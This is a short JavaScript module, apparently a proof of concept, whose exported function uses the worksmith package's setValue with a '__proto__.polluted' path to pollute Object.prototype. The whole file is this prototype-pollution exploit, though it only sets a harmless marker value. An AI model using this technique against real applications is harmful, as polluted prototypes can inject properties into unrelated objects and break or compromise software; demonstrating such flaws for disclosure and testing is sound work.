const worksmith = require("worksmith");

function exploitFunction(payload) {
    const obj = {};
    worksmith.setValue(obj, "__proto__.polluted", "yes");
    return obj;
}

module.exports = { exploitFunction };